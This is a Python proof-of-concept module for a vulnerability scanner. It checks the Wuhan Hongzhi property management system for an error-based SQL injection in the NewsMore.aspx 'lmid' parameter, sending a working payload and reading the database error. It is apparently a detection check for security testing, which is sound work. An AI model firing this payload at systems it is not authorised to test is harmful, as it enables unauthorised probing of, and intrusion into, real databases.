# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Hongzhi_0011'  # 平台漏洞编号，留空
    name = '武汉弘智房产管理系统通用 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-27'  # 漏洞公布时间
    desc = '''
        武汉弘智科技房产管理系统是由武汉弘智科技打造的一款房产管理维护一体化系统。
        武汉弘智科技房产管理系统SQL注入漏洞。
        /Web_Site/NewsMore.aspx?lmid=1'
        /web/Web_Site/NewsMore.aspx?lmid=1'
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=110327'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '弘智房产管理系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ad81bf67-bc20-4df1-bf60-0da33e366ca4'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            payloads = [
                '/Web_Site/NewsMore.aspx?lmid=1',
                '/web/Web_Site/NewsMore.aspx?lmid=1'
            ]
            getdata = '%29and%20db_name%281%29=0--'
            for payload in payloads:
                url = self.target + payload + getdata
                code, head, res, errcode, _ = hh.http(url)
                if code == 500 and 'master' in res:
                    #security_hole(arg + payload + '   :found sql Injection')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
